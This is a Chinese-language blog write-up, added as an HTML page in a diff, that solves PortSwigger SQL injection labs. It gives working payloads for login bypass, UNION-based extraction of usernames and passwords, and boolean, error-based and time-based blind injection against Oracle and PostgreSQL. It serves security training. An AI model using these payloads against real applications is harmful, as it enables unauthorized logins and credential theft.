@@ -1,0 +1,800 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>PortSwigger SQL INJECTION - sleeper</title>
+
+  
+    <meta name="description" content="SQL INJECTIONLab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data ​            This lab contains a SQL injection vulnerability in the  product category filter. When the u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger SQL INJECTION">
+<meta property="og:url" content="http://example.com/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/index.html">
+<meta property="og:site_name" content="sleeper">
+<meta property="og:description" content="SQL INJECTIONLab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data ​            This lab contains a SQL injection vulnerability in the  product category filter. When the u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510132134993.png">
+<meta property="article:published_time" content="2025-10-05T17:04:38.438Z">
+<meta property="article:modified_time" content="2025-10-14T14:33:56.296Z">
+<meta property="article:author" content="she11f">
+<meta property="article:tag" content="PortSwigger">
+<meta property="article:tag" content="SQL INJECTION">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510132134993.png">
+  
+  
+  
+  <meta name="keywords" content="PortSwigger,SQL INJECTION">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image%2Ficon.svg">
+  
+
+  
+
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">sleeper</div><div class="sub normal cap">自由而全面的发展</div><div class="sub hover cap" style="opacity:0"> Stay hungry，Stay foolish</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"><span class="title">PortSwigger Authentication</span></a><a class="item title" href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/"><span class="title">PortSwigger Information Disclosure</span></a><a class="item title" href="/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><span class="title">PortSwigger XSS</span></a><a class="item title" href="/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/"><span class="title">PortSwigger SQL INJECTION</span></a><a class="item title" href="/2024/09/05/java/%E5%BC%80%E5%8F%91/JavaWeb/"><span class="title">JavaWeb 学习</span></a><a class="item title" href="/2025/03/26/work/%E6%8A%A4%E7%BD%91%E6%80%BB%E7%BB%93/"><span class="title">hvv知识点</span></a><a class="item title" href="/2025/02/13/go/%E5%BC%80%E5%8F%91/%E5%8A%9F%E8%83%BD%E5%BC%80%E5%8F%91/"><span class="title">go 红蓝武器库功能开发</span></a><a class="item title" href="/2025/05/10/%E9%9D%B6%E5%9C%BA/%E7%8E%84%E6%9C%BA/1/"><span class="title">第一章 应急响应-webshell查杀</span></a><a class="item title" href="/2025/03/30/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK(1)/"><span class="title">红日内网靶场 1</span></a><a class="item title" href="/2024/10/06/go/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8/"><span class="title">go 入门</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/PortSwigger/">PortSwigger</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/PortSwigger/SQL-INJECTION/">SQL INJECTION</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-10-05T17:04:38.438Z">2025-10-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-10-14T14:33:56.296Z">2025-10-14</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>PortSwigger SQL INJECTION</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="SQL-INJECTION"><a href="#SQL-INJECTION" class="headerlink" title="SQL INJECTION"></a>SQL INJECTION</h1><h3 id="Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. When the user selects a category, the  application carries out a SQL query like the following:        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1</span><br></pre></td></tr></table></figure>
+
+<p>​            To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.        </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+OR+1=1--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-vulnerability-allowing-login-bypass"><a href="#Lab-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="Lab: SQL injection vulnerability allowing login bypass"></a>Lab: SQL injection vulnerability allowing login bypass</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the login function.        </p>
+<p>​            To solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code> user.        </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=administrator&#x27;--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="Lab: SQL injection UNION attack, determining the number of columns returned by the query"></a>Lab: SQL injection UNION attack, determining the number of columns returned by the query</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response, so you can use a UNION attack to retrieve data  from other tables. The first step of such an attack is to determine the  number of columns that are being returned by the query. You will then  use this technique in subsequent labs to construct the full attack.        </p>
+<p>​            To solve the lab, determine the number of columns returned  by the query by performing a SQL injection UNION attack that returns an  additional row containing null values.        </p>
+</blockquote>
+<p>order by 查列数，或者 union，select 查列数(这题想过必须用union，select) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filter?category=Corporate+gifts&#x27; order by 3--</span><br><span class="line">filter?category=Corporate+gifts&#x27; union select null,null,null--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#Lab-SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="Lab: SQL injection UNION attack, finding a column containing text"></a>Lab: SQL injection UNION attack, finding a column containing text</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response, so you can use a UNION attack to retrieve data  from other tables. To construct such an attack, you first need to  determine the number of columns returned by the query. You can do this  using a technique you learned in a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">previous lab</a>. The next step is to identify a column that is compatible with string data.        </p>
+<p>​            The lab will provide a random value that you need to make  appear within the query results. To solve the lab, perform a SQL  injection UNION attack that returns an additional row containing the  value provided. This technique helps you determine which columns are  compatible with string data.        </p>
+</blockquote>
+<p>就是想找到哪个列能够容纳字符串数据，方便我们下一步带出数据库的内容，替换空值一列一列试就行，不是字符串型的就会报错，试到第二列就找到了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gifts&#x27; union select null,&#x27;xWslwe&#x27;,null --</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="Lab: SQL injection UNION attack, retrieving data from other tables"></a>Lab: SQL injection UNION attack, retrieving data from other tables</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response, so you can use a UNION attack to retrieve data  from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.        </p>
+<p>​            To solve the lab, perform a SQL injection UNION attack that  retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<p>题目告诉我们了，有个表 users，和列名 username，password。然后让我们获取管理员账号密码，依旧 order by 看取了几列，然后 测试哪个列能带出字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Gifts&#x27; union select username,password from users--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="Lab: SQL injection UNION attack, retrieving multiple values in a single column"></a>Lab: SQL injection UNION attack, retrieving multiple values in a single column</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application’s response so you can use a UNION attack to retrieve data  from other tables.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.        </p>
+<p>​            To solve the lab, perform a SQL injection UNION attack that  retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<p>只有一个列可以容纳字符串，可以通过将值连接在一起来检索此单列中的多个值，可以查这个表</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<p>| Oracle     | <code>                   &#39;foo&#39;||&#39;bar&#39;               </code>           |<br>| ———- | ———————————————————— |<br>| Microsoft  | <code>                   &#39;foo&#39;+&#39;bar&#39;               </code>            |<br>| PostgreSQL | <code>                   &#39;foo&#39;||&#39;bar&#39;               </code>           |<br>| MySQL      | <code>&#39;foo&#39; &#39;bar&#39;</code> [Note the space between the two strings]                     <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code> |</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Gifts&#x27; union select null,username||&#x27;~&#x27;||password from users--</span><br><span class="line">Gifts&#x27; union select null,concat(username,&#x27;~&#x27;,password) from users--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Blind-SQL-injection-with-conditional-responses"><a href="#Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab: Blind SQL injection with conditional responses"></a>Lab: Blind SQL injection with conditional responses</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The results of the SQL query are not returned, and no error messages are displayed. But the application includes a            <code>Welcome back</code> message in the page if the query returns any rows.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.     </p>
+</blockquote>
+<p>burpsuite 抓包，  修改 <code>TrackingId</code>cookie，将其更改为：                         </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qvo4LQBOsQ69LE2x&#x27; AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p> 验证 <code>Welcome back</code>消息出现在响应中。现在将其更改为：                         </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qvo4LQBOsQ69LE2x&#x27; AND &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>验证 <code>Welcome back</code>消息未出现在响应中。这演示了如何测试单个布尔条件并推断结果。                        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=qvo4LQBOsQ69LE2x&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), 1, 1) = &#x27;s</span><br></pre></td></tr></table></figure>
+
+<p>也可以先爆破长度</p>
+<h3 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows. If the SQL query causes an error, then the application returns a custom error message.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<p>这一题条件盲注实效了，不管真或假都返回一样的，那我们就可以尝试条件错误漏洞,题目提示我们是 oracle 数据库，我们可以对着这个表查询一下。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGV2pWiP6dUlEiv<span class="string">&#x27; AND (SELECT CASE WHEN 1=0 THEN to_char(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM dual)=&#x27;</span>a</span><br></pre></td></tr></table></figure>
+
+<p>这里 to_char(1&#x2F;0) 为什么不直接 1&#x2F;0 来触发除0报错呢，因为 在 Oracle 中，<code>CASE</code> 表达式的所有可能返回路径<strong>必须具有相同的数据类型</strong>：也就是说 then 返回的数据类型和 else 返回的要一致，不然等不到触发除0报错就开始报错了</p>
+<p>爆破长度为 20</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGV2pWiP6dUlEiv<span class="string">&#x27; AND (SELECT CASE WHEN length(password)=1 THEN to_char(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END from users where username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a</span><br></pre></td></tr></table></figure>
+
+<p>然后设置集束炸弹爆破20个位置的每一个字符了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGV2pWiP6dUlEiv&#x27; AND (SELECT CASE WHEN SUBSTR(password,1,1)=&#x27;t&#x27; THEN to_char(1/0) ELSE &#x27;a&#x27; END from users where username=&#x27;administrator&#x27;)=&#x27;a</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Visible-error-based-SQL-injection"><a href="#Lab-Visible-error-based-SQL-injection" class="headerlink" title="Lab: Visible error-based SQL injection"></a>Lab: Visible error-based SQL injection</h3><blockquote>
+<p>​            This lab contains a SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie. The results of the  SQL query are not returned.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. To solve the lab, find a way to leak the password for the <code>administrator</code> user, then log in to their account.        </p>
+</blockquote>
+<p>这题用的报错注入，加一个单引号直接爆出错误消息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started <span class="keyword">at</span> position <span class="number">52</span> <span class="keyword">in</span> <span class="keyword">SQL</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tracking <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1WgE3VBZpDwz8Skn&#x27;&#x27;. Expected  char</span></span><br></pre></td></tr></table></figure>
+
+<p>利用 cast 转换字符串为int会报错的特性,因为查询语句长度有限制，要用 limt 还要把 cookie 之前的值删了，因为有长度限制会截断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or CAST((SELECT username from users limit 1) AS int)=1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span> <span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Blind-SQL-injection-with-time-delays"><a href="#Lab-Blind-SQL-injection-with-time-delays" class="headerlink" title="Lab: Blind SQL injection with time delays"></a>Lab: Blind SQL injection with time delays</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows or causes an error. However, since the query is  executed synchronously, it is possible to trigger conditional time  delays to infer information.        </p>
+<p>​            To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.        </p>
+</blockquote>
+<p>延时注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=x&#x27;||pg_sleep(10)--</span><br></pre></td></tr></table></figure>
+
+<p>|| 是连接符，和 ，mysql 不一样的是PostgreSQL不允许 <code>OR pg_sleep(10)</code>，因为<strong>类型不匹配</strong>：不能将布尔值与 void 用 OR 连接</p>
+<p>假如不用连接符用 or 表达式，</p>
+<ul>
+<li><strong>左边</strong>：<code>id = &#39;x&#39;</code> → 布尔值（TRUE&#x2F;FALSE）</li>
+<li><strong>右边</strong>：<code>pg_sleep(10)</code> → 返回 void（无返回值）</li>
+</ul>
+<h3 id="Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Lab: Blind SQL injection with time delays and information retrieval"></a>Lab: Blind SQL injection with time delays and information retrieval</h3><blockquote>
+<p>​            This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.        </p>
+<p>​            The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows or causes an error. However, since the query is  executed synchronously, it is possible to trigger conditional time  delays to infer information.        </p>
+<p>​            The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.        </p>
+<p>​            To solve the lab, log in as the <code>administrator</code> user.        </p>
+</blockquote>
+<p>在上一题的基础上把账号密码爆破出来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vSDNFCcNXur0Qevt<span class="string">&#x27; || (SELECT CASE WHEN (username=&#x27;</span>administrator<span class="string">&#x27; and length(password)=0) THEN pg_sleep(2) ELSE pg_sleep(0) END from users)--</span></span><br><span class="line"><span class="string">vSDNFCcNXur0Qevt&#x27;</span> <span class="operator">||</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span> <span class="keyword">and</span> <span class="built_in">SUBSTRING</span>(password,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>) <span class="keyword">THEN</span> pg_sleep(<span class="number">2</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span> <span class="keyword">from</span> users)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
